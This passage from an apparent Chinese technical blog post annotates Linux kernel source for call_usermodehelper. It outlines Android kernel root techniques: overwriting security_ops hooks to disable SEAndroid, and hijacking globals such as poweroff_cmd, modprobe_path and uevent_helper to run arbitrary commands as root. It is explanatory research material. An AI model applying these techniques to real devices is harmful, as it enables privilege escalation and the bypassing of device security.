int (*init)(struct subprocess_info *info),\n\t\t    void (*cleanup)(struct subprocess_info *info),\n\t\t    void *data)\n{\n\t//设置subprocess_info初始化函数和清理函数 以及相关参数\n\t//设置subprocess_info init函数cleanup函数和data数据\n\tinfo->cleanup = cleanup;\n\tinfo->init = init;\n\tinfo->data = data;\n}\n```\n\n##### 2、执行设置的用户空间程序:可以看到内核中实际执行函数为__call_usermodehelper\n\n```c\nhttps://elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L387\n\nint call_usermodehelper_exec(struct subprocess_info *sub_info,\n\t\t\t     enum umh_wait wait)\n{\n\tDECLARE_COMPLETION_ONSTACK(done);\n\tint retval = 0;\n\n\thelper_lock();\n\tif (sub_info->path[0] == '\\0')\n\t\tgoto out;\n\n\tif (!khelper_wq || usermodehelper_disabled) {\n\t\tretval = -EBUSY;\n\t\tgoto out;\n\t}\n\n\tsub_info->complete = &done;\n\tsub_info->wait = wait;\n\n    //__call_usermodehelper\n    //INIT_WORK(&sub_info->work, __call_usermodehelper);\n    //执行__call_usermodehelper\n\tqueue_work(khelper_wq, &sub_info->work);\n\tif (wait == UMH_NO_WAIT)\t/* task has freed sub_info */\n\t\tgoto unlock;\n\twait_for_completion(&done);\n\tretval = sub_info->retval;\n\nout:\n\t//回收资源 清理函数\n\tcall_usermodehelper_freeinfo(sub_info);\nunlock:\n\thelper_unlock();\n\treturn retval;\n}\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L164\n\n//调用subprocess_info清理函数 并回收subprocess_info内存\nvoid call_usermodehelper_freeinfo(struct subprocess_info *info)\n{\n\tif (info->cleanup)\n\t\t(*info->cleanup)(info);\n\tkfree(info);\n}\n```\n\n\n##### 3、__call_usermodehelper通过建立一个内核线程完成用户空间程序的执行____call_usermodehelper\n\n```c\n\n__call_usermodehelper\nhttps://elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L213\n\n\nstatic void __call_usermodehelper(struct work_struct *work)\n{\n\tstruct subprocess_info *sub_info =\n\t\tcontainer_of(work, struct subprocess_info, work);\n\tenum umh_wait wait = sub_info->wait;\n\tpid_t pid;\n\n\t/* CLONE_VFORK: wait until the usermode helper has execve'd\n\t * successfully We need the data structures to stay around\n\t * until that is done.  */\n\tif (wait == UMH_WAIT_PROC)\n\t    //创建一个等待线程wait_for_helper\n\t\tpid = kernel_thread(wait_for_helper, sub_info,\n\t\t\t\t    CLONE_FS | CLONE_FILES | SIGCHLD);\n\telse\n\t    //创建____call_usermodehelper线程\n\t\tpid = kernel_thread(____call_usermodehelper, sub_info,\n\t\t\t\t    CLONE_VFORK | SIGCHLD);\n\n\tswitch (wait) {\n\tcase UMH_NO_WAIT:\n\t\t//清理空间\n\t\tcall_usermodehelper_freeinfo(sub_info);\n\t\tbreak;\n\n\tcase UMH_WAIT_PROC:\n\t\tif (pid > 0)\n\t\t\tbreak;\n\t\t/* FALLTHROUGH */\n\tcase UMH_WAIT_EXEC:\n\t\tif (pid < 0)\n\t\t\tsub_info->retval = pid;\n\t\tcomplete(sub_info->complete);\n\t}\n}\n```\n\n\n##### 4、通过内核线程执行用户空间的程序____call_usermodehelper\n\n```c\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L132\n\nstatic int ____call_usermodehelper(void *data)\n{\n\tstruct subprocess_info *sub_info = data;\n\tint retval;\n\n\tspin_lock_irq(&current->sighand->siglock);\n\tflush_signal_handlers(current, 1);\n\tspin_unlock_irq(&current->sighand->siglock);\n\n\t/* We can run anywhere, unlike our parent keventd(). */\n\tset_cpus_allowed_ptr(current, cpu_all_mask);\n\n\t/*\n\t * Our parent is keventd, which runs with elevated scheduling priority.\n\t * Avoid propagating that into the userspace child.\n\t */\n\tset_user_nice(current, 0);\n\n\tif (sub_info->init) {\n\t\tretval = sub_info->init(sub_info);\n\t\tif (retval)\n\t\t\tgoto fail;\n\t}\n\n    //实际上的执行函数\n\tretval = kernel_execve(sub_info->path, sub_info->argv, sub_info->envp);\n\n\t/* Exec failed? */\nfail:\n\tsub_info->retval = retval;\n\tdo_exit(0);\n}\n```\n\n##### 5、可以看到最后执行用户空间程序的函数是kernel_execve,对于不同的体系结构,kernel_execve有所不同    \n\n\n###### 5.1、x64下的执行——通过[__NR_execve系统调用](https://elixir.bootlin.com/linux/v2.6.35/source/arch/x86/include/asm/unistd_64.h#L140)\n\n通过系统调用__NR_execve执行\n\n```c\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/arch/sh/kernel/sys_sh64.c#L36\nint kernel_execve(const char *filename, char *const argv[], char *const envp[])\n{\n\tregister unsigned long __sc0 __asm__ (\"r9\") = ((0x13 << 16) | __NR_execve);\n\tregister unsigned long __sc2 __asm__ (\"r2\") = (unsigned long) filename;\n\tregister unsigned long __sc3 __asm__ (\"r3\") = (unsigned long) argv;\n\tregister unsigned long __sc4 __asm__ (\"r4\") = (unsigned long) envp;\n\t__asm__ __volatile__ (\"trapa\t%1 !\\t\\t\\t execve(%2,%3,%4)\"\n\t: \"=r\" (__sc0)\n\t: \"r\" (__sc0), \"r\" (__sc2), \"r\" (__sc3), \"r\" (__sc4) );\n\t__asm__ __volatile__ (\"!dummy\t%0 %1 %2 %3\"\n\t: : \"r\" (__sc0), \"r\" (__sc2), \"r\" (__sc3), \"r\" (__sc4) : \"memory\");\n\treturn __sc0;\n}\n```\n\n\n###### 5.2、32位x86下的执行——通过[__NR_execve系统调用](https://elixir.bootlin.com/linux/v2.6.35/source/arch/x86/include/asm/unistd_32.h#L19)\n\n通过系统调用__NR_execve执行\n\n```c\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/arch/sh/kernel/sys_sh32.c#L74\nint kernel_execve(const char *filename, char *const argv[], char *const envp[])\n{\n\tregister long __sc0 __asm__ (\"r3\") = __NR_execve;\n\tregister long __sc4 __asm__ (\"r4\") = (long) filename;\n\tregister long __sc5 __asm__ (\"r5\") = (long) argv;\n\tregister long __sc6 __asm__ (\"r6\") = (long) envp;\n\t__asm__ __volatile__ (SYSCALL_ARG3 : \"=z\" (__sc0)\n\t\t\t: \"0\" (__sc0), \"r\" (__sc4), \"r\" (__sc5), \"r\" (__sc6)\n\t\t\t: \"memory\");\n\treturn __sc0;\n}\n```\n\n\n###### 5.3、arm下的执行\n\narm下通过调用do_execve执行用户空间的程序\n\n```c\n\nint kernel_execve(const char *filename, char *const argv[], char *const envp[])\n{\n\tstruct pt_regs regs;\n\tint ret;\n\n\tmemset(&regs, 0, sizeof(struct pt_regs));\n\t//调用do_execve执行\n\tret = do_execve((char *)filename, (char __user * __user *)argv,\n\t\t\t(char __user * __user *)envp, &regs);\n\tif (ret < 0)\n\t\tgoto out;\n\n\t/*\n\t * Save argc to the register structure for userspace.\n\t */\n\tregs.ARM_r0 = ret;\n\n\t/*\n\t * We were successful.  We won't be returning to our caller, but\n\t * instead to user space by manipulating the kernel stack.\n\t */\n\tasm(\t\"add\tr0, %0, %1\\n\\t\"\n\t\t\"mov\tr1, %2\\n\\t\"\n\t\t\"mov\tr2, %3\\n\\t\"\n\t\t\"bl\tmemmove\\n\\t\"\t/* copy regs to top of stack */\n\t\t\"mov\tr8, #0\\n\\t\"\t/* not a syscall */\n\t\t\"mov\tr9, %0\\n\\t\"\t/* thread structure */\n\t\t\"mov\tsp, r0\\n\\t\"\t/* reposition stack pointer */\n\t\t\"b\tret_to_user\"\n\t\t:\n\t\t: \"r\" (current_thread_info()),\n\t\t  \"Ir\" (THREAD_START_SP - sizeof(regs)),\n\t\t  \"r\" (&regs),\n\t\t  \"Ir\" (sizeof(regs))\n\t\t: \"r0\", \"r1\", \"r2\", \"r3\", \"ip\", \"lr\", \"memory\");\n\n out:\n\treturn ret;\n}\n```\n\n\n### call_usermodehelper实现root思路\n\n1、从security_ops结构中(security_operations)找到cap_task_prctl表的地址\n2、修改cap_task_prctl的值为reset_security_ops的地址\n3、调用prctl函数关闭SEAndroid\n4、修改cap_task_prctl为call_usermodehelper函数地址实现以内核线程执行用户空间程序\n\n\n#### security_ops结构简介\n\n可以发现当执行security_task_prctl实际上就是执行cap_task_prctl,且5个参数均原封不动的进行了传递,均可控\n\n```c\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/security/security.c#L28\nstatic struct security_operations *security_ops;\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/security.h#L1364\n\nstruct security_operations {\n...\n...\n...\n}\n\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/security.h#L1762\nint security_task_prctl(int option, unsigned long arg2, unsigned long arg3,\n\t\t\tunsigned long arg4, unsigned long arg5);\n\t\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/security.h#L74\t\t\t\nstatic inline int security_task_prctl(int option, unsigned long arg2,\n\t\t\t\t      unsigned long arg3,\n\t\t\t\t      unsigned long arg4,\n\t\t\t\t      unsigned long arg5)\n{\n\treturn cap_task_prctl(option, arg2, arg3, arg3, arg5);\n}\n```\n\n#### reset_security_ops函数简介\n在security_init初始化时候有个默认的default_security_ops,通过security_fixup_ops\n对默认的security_ops进行了相关安全、权限函数的设置(cap_key_free等),所以设置相关selinux等\n安全性函数是通过security_fixup_ops实现的,默认的default_security_ops并未有任何相关的保护\nreset_security_ops用于设置security_ops为default_security_ops即达到关闭selinux的目的\n\n```c\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/security/security.c#L57\nint __init security_init(void)\n{\n\tprintk(KERN_INFO \"Security Framework initialized\\n\");\n\n    //security fixup\n    //https://elixir.bootlin.com/linux/v2.6.35/source/security/capability.c#L857\n\t\n    //ops->function = cap_##function;  cap_key_free等\n    //security_fixup_ops是设置相关cap函数开启安全性\n    //default_security_ops没有开启\n    \n    //函数set_to_cap_if_null(https://elixir.bootlin.com/linux/v2.6.35/source/security/capability.c#L848)\n    security_fixup_ops(&default_security_ops);\n\tsecurity_ops = &default_security_ops;\n\tdo_security_initcalls();\n\n\treturn 0;\n}\n\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/security/security.c#L68\nvoid reset_security_ops(void)\n{\n\t//关闭selinux相关安全保护\n\tsecurity_ops = &default_security_ops;\n}\n```\n\n#### 调用prctl函数关闭SEAndroid——cap_task_prctl的值为reset_security_ops的地址\n\n当修改cap_task_prctl为reset_security_ops的地址时,通过调用prctl系统调用,实现security_task_prctl调用,\n而从上面security_ops结构简介中我们知道security_task_prctl会调用cap_task_prctl,所以此时截获控制流执行reset_security_ops函数关闭SEAndroid\n\n```c\nhttps://elixir.bootlin.com/linux/v2.6.35/source/kernel/sys.c#L1466\n\n\nprctl系统调用调用security_task_prctl(security_task_prctl实际上调用cap_task_prctl,而cap_task_prctl被修改成了reset_security_ops从而关闭了SEAndroid)\nSYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,\n\t\tunsigned long, arg4, unsigned long, arg5)\n{\n\tstruct task_struct *me = current;\n\tunsigned char comm[sizeof(me->comm)];\n\tlong error;\n\n\terror = security_task_prctl(option, arg2, arg3, arg4, arg5);\n\tif (error != -ENOSYS)\n\t\treturn error;\n\n\terror = 0;\n\tswitch (option) {\n\t\tcase PR_SET_PDEATHSIG:\n\t\t...\n\t\t...\n\t\t...\n\t}\n\treturn error;\n```\n\n#### 实现root \n    \n同理修改cap_task_prctl为call_usermodehelper函数地址,调用prctl函数\n(security_task_prctl===>cap_task_prctl)将会执行call_usermodehelper\n从而在内核中执行用户指定的程序(security_task_prctl 5个参数都可控)\n\n#### 缺点\n\n由于prctl第一个参数是int是个32位当在64位系统环境会被截断\n\n### 间接调用call_usermodehelper实现root思路\n\n如果security_ops结构很难被修改,需要找到一种更好的方法与覆盖的结构体无关且不会限制输入的参数\n通过查找call_usermodehelper相关api的调用点,可以在内核中找到间接调用call_usermodehelper的几个有趣函数\n\n通过查找call_usermodehelper调用点,存在下面几个潜在的点:修改全局变量poweroff_cmd、modprobe_path、\nocfs2_hb_ctl_path、nfs_cache_getent_prog、cltrack_prog、uevent_helper然后截获控制流到__orderly_poweroff、\ncall_modprobe(2版本内核没有)、ocfs2_leave_group、nfs_cache_upcall、nfsd4_umh_cltrack_upcall、\nkobject_uevent_env(HotplugEater热插拔相关的)即可实现root\n\n\n\n#### 1、通过poweroff_cmd执行call_usermodehelper\n\n如果修改了全局的poweroff_cmd,且截获控制流到__orderly_poweroff则可以执行任意命令\n\n```go\n\nhttps://elixir.bootlin.com/linux/v3.16.50/source/kernel/reboot.c#L308\nchar poweroff_cmd[POWEROFF_CMD_PATH_LEN] = \"/sbin/poweroff\";\n\nstatic int __orderly_poweroff(bool force)\n{\n\tchar **argv;\n\tstatic char *envp[] = {\n\t\t\"HOME=/\",\n\t\t\"PATH=/sbin:/bin:/usr/sbin:/usr/bin\",\n\t\tNULL\n\t};\n\tint ret;\n\n\targv = argv_split(GFP_KERNEL, poweroff_cmd, NULL);\n\tif (argv) {\n\t\t//执行/sbin/poweroff  任意命令执行\n\t\tret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n\t\targv_free(argv);\n\t} else {\n\t\tret = -ENOMEM;\n\t}\n\n\tif (ret && force) {\n\t\tpr_warn(\"Failed to start orderly shutdown: forcing the issue\\n\");\n\t\t/*\n\t\t * I guess this should try to kick off some daemon to sync and\n\t\t * poweroff asap.  Or not even bother syncing if we're doing an\n\t\t * emergency shutdown?\n\t\t */\n\t\temergency_sync();\n\t\tkernel_power_off();\n\t}\n\n\treturn ret;\n}\n```\n\n#### 2、通过modprobe_path执行call_usermodehelper\n\n如果修改了全局的modprobe_path且截获控制流到call_modprobe则可以执行任意命令\n\n```c\n\nhttps://elixir.bootlin.com/linux/v3.16.50/source/kernel/kmod.c#L70\nchar modprobe_path[KMOD_PATH_LEN] = \"/sbin/modprobe\";\n\n//清理函数 释放回收内存\nstatic void free_modprobe_argv(struct subprocess_info *info)\n{\n\tkfree(info->argv[3]); /* check call_modprobe() */\n\tkfree(info->argv);\n}\n\nstatic int call_modprobe(char *module_name, int wait)\n{\n\tstruct subprocess_info *info;\n\tstatic char *envp[] = {\n\t\t\"HOME=/\",\n\t\t\"TERM=linux\",\n\t\t\"PATH=/sbin:/usr/sbin:/bin:/usr/bin\",\n\t\tNULL\n\t};\n\n\tchar **argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);\n\tif (!argv)\n\t\tgoto out;\n\n\tmodule_name = kstrdup(module_name, GFP_KERNEL);\n\tif (!module_name)\n\t\tgoto free_argv;\n\n\targv[0] = modprobe_path;\n\targv[1] = \"-q\";\n\targv[2] = \"--\";\n\targv[3] = module_name;\t/* check free_modprobe_argv() */\n\targv[4] = NULL;\n\n    //执行modprobe_path  实现任意命令执行\n\tinfo = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,\n\t\t\t\t\t NULL, free_modprobe_argv, NULL);\n\tif (!info)\n\t\tgoto free_module_name;\n\n\treturn call_usermodehelper_exec(info, wait | UMH_KILLABLE);\n\nfree_module_name:\n\tkfree(module_name);\nfree_argv:\n\tkfree(argv);\nout:\n\treturn -ENOMEM;\n}\n```\n\n#### 3、通过ocfs2_leave_group执行\n\n通过修改全局ocfs2_hb_ctl_path且截获控制流到ocfs2_leave_group从而执行任意命令\n\n```c\n\nhttps://elixir.bootlin.com/linux/v3.16.50/source/fs/ocfs2/stackglue.c#L432\nstatic void ocfs2_leave_group(const char *group)\n{\n\tint ret;\n\tchar *argv[5], *envp[3];\n\n\targv[0] = ocfs2_hb_ctl_path;\n\targv[1] = \"-K\";\n\targv[2] = \"-u\";\n\targv[3] = (char *)group;\n\targv[4] = NULL;\n\n\t/* minimal command environment taken from cpu_run_sbin_hotplug */\n\tenvp[0] = \"HOME=/\";\n\tenvp[1] = \"PATH=/sbin:/bin:/usr/sbin:/usr/bin\";\n\tenvp[2] = NULL;\n\n    //执行ocfs2_hb_ctl_path 实现任意命令执行\n\tret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);\n\tif (ret < 0) {\n\t\tprintk(KERN_ERR\n\t\t       \"ocfs2: Error %d running user helper \"\n\t\t       \"\\\"%s %s %s %s\\\"\\n\",\n\t\t       ret, argv[0], argv[1], argv[2], argv[3]);\n\t}\n}\n```\n\n#### 4、通过nfs_cache_upcall函数\n\n通过修改全局nfs_cache_getent_progq且截获控制流到nfs_cache_upcall达到任意代码执行\n\n```c\n\nhttps://elixir.bootlin.com/linux/v3.16.50/source/fs/nfs/cache_lib.c#L34\nint nfs_cache_upcall(struct cache_detail *cd, char *entry_name)\n{\n\tstatic char *envp[] = { \"HOME=/\",\n\t\t\"TERM=linux\",\n\t\t\"PATH=/sbin:/usr/sbin:/bin:/usr/bin\",\n\t\tNULL\n\t};\n\tchar *argv[] = {\n\t\tnfs_cache_getent_prog,\n\t\tcd->name,\n\t\tentry_name,\n\t\tNULL\n\t};\n\tint ret = -EACCES;\n\n\tif (nfs_cache_getent_prog[0] == '\\0')\n\t\tgoto out;\n\t//执行nfs_cache_getent_prog 实现任意代码执行\n\tret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n\t/*\n\t * Disable the upcall mechanism if we're getting an ENOENT or\n\t * EACCES error. The admin can re-enable it on the fly by using\n\t * sysfs to set the 'cache_getent' parameter once the problem\n\t * has been fixed.\n\t */\n\tif (ret == -ENOENT || ret == -EACCES)\n\t\tnfs_cache_getent_prog[0] = '\\0';\nout:\n\treturn ret > 0 ? 0 : ret;\n}\n```\n\n\n#### 5、通过nfsd4_umh_cltrack_upcall函数\n\n修改全局变量cltrack_prog且截获控制流到nfsd4_umh_cltrack_upcall实现任意代码执行\n\n```c\n\nhttps://elixir.bootlin.com/linux/v3.16.50/source/fs/nfsd/nfs4recover.c#L1129\nstatic int\nnfsd4_umh_cltrack_upcall(char *cmd, char *arg, char *legacy)\n{\n\tchar *envp[2];\n\tchar *argv[4];\n\tint ret;\n\n\tif (unlikely(!cltrack_prog[0])) {\n\t\tdprintk(\"%s: cltrack_prog is disabled\\n\", __func__);\n\t\treturn -EACCES;\n\t}\n\n\tdprintk(\"%s: cmd: %s\\n\", __func__, cmd);\n\tdprintk(\"%s: arg: %s\\n\", __func__, arg ? arg : \"(null)\");\n\tdprintk(\"%s: legacy: %s\\n\", __func__, legacy ? legacy : \"(null)\");\n\n\tenvp[0] = legacy;\n\tenvp[1] = NULL;\n\n\targv[0] = (char *)cltrack_prog;\n\targv[1] = cmd;\n\targv[2] = arg;\n\targv[3] = NULL;\n\n    //执行cltrack_prog 实现任意代码执行\n\tret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);\n\t/*\n\t * Disable the upcall mechanism if we're getting an ENOENT or EACCES\n\t * error. The admin can re-enable it on the fly by using sysfs\n\t * once the problem has been fixed.\n\t */\n\tif (ret == -ENOENT || ret == -EACCES) {\n\t\tdprintk(\"NFSD: %s was not found or isn't executable (%d). \"\n\t\t\t\"Setting cltrack_prog to blank string!\",\n\t\t\tcltrack_prog, ret);\n\t\tcltrack_prog[0] = '\\0';\n\t}\n\tdprintk(\"%s: %s return value: %d\\n\", __func__, cltrack_prog, ret);\n\n\treturn ret;\n}\n```\n\n#### 6、通过kobject_uevent_env函数——HotplugEater(热插拔相关)\n\n修改uevent_helper变量实现任意代码执行\n\n```c\n通过修改uevent_helper实现任意代码执行\n\nuevent_helper定义\nhttps://elixir.bootlin.com/linux/v3.16.50/source/lib/kobject_uevent.c#L33\nchar uevent_helper[UEVENT_HELPER_PATH_LEN] = CONFIG_UEVENT_HELPER_PATH;\n\n初始化env为uevent_helper\nhttps://elixir.bootlin.com/linux/v3.16.50/source/lib/kobject_uevent.c#L130\nstatic int init_uevent_argv(struct kobj_uevent_env *env, const char *subsystem)\n{\n\tint len;\n\n\tlen = strlcpy(&env->buf[env->buflen], subsystem,\n\t\t      sizeof(env->buf) - env->buflen);\n\tif (len >= (sizeof(env->buf) - env->buflen)) {\n\t\tWARN(1, KERN_ERR \"init_uevent_argv: buffer size too small\\n\");\n\t\treturn -ENOMEM;\n\t}\n\n    //uevent_helper\n\tenv->argv[0] = uevent_helper;\n\tenv->argv[1] = &env->buf[env->buflen];\n\tenv->argv[2] = NULL;\n\n\tenv->buflen += len + 1;\n\treturn 0;\n}\n\nhttps://elixir.bootlin.com/linux/v3.16.50/source/lib/kobject_uevent.c#L165\nint kobject_uevent_env(struct kobject *kobj, enum kobject_action action,\n\t\t       char *envp_ext[])\n{\n\t...\n\t...\n\t...\n\n#ifdef CONFIG_UEVENT_HELPER\n\t/* call uevent_helper, usually only enabled during early boot */\n\tif (uevent_helper[0] && !kobj_usermode_filter(kobj)) {\n\t\tstruct subprocess_info *info;\n\n\t\tretval = add_uevent_var(env, \"HOME=/\");\n\t\tif (retval)\n\t\t\tgoto exit;\n\t\tretval = add_uevent_var(env,\n\t\t\t\t\t\"PATH=/sbin:/bin:/usr/sbin:/usr/bin\");\n\t\tif (retval)\n\t\t\tgoto exit;\n\t\t//初始化env\t\n\t\tretval = init_uevent_argv(env, subsystem);\n\t\tif (retval)\n\t\t\tgoto exit;\n\n\t\tretval = -ENOMEM;\n\t\t//执行env->argv[0](init_uevent_argv中初始化)\n\t\tinfo = call_usermodehelper_setup(env->argv[0], env->argv,\n\t\t\t\t\t\t env->envp, GFP_KERNEL,\n\t\t\t\t\t\t NULL, cleanup_uevent_env, env);\n\t\tif (info) {\n\t\t\tretval = call_usermodehelper_exec(info, UMH_NO_WAIT);\n\t\t\tenv = NULL;\t/* freed by cleanup_uevent_env */\n\t\t}\n\t}\n#endif\n\nexit:\n\tkfree(devpath);\n\tkfree(env);\n\treturn retval;\n}\n```\n\n\n#### 总结\n\n其中orderly_poweroff看起来相当不错,热插拔只要修改uevent_helper变量即可实现任意代码执行\n\n利用思路如下(间接调用call_usermodehelper):\n1、修改poweroff_cmd变量的值为你想要执行的命令\n2、关闭SEAndroid(调用reset_security_ops函数,详细分析在上面)\n3、修改FPT(File Struct operation pointer table)——文件相关操作的指针(ptmx等)为orderly_poweroff\n3、trap FPT相关的函数调用,截获控制流实现任意代码执行\n\n### Reference\n\n[New Reliable Android Kernel Root Exploitation Techniques](http://powerofcommunity.net/poc2016/x82.pdf)\n","tags":["exploit"]}]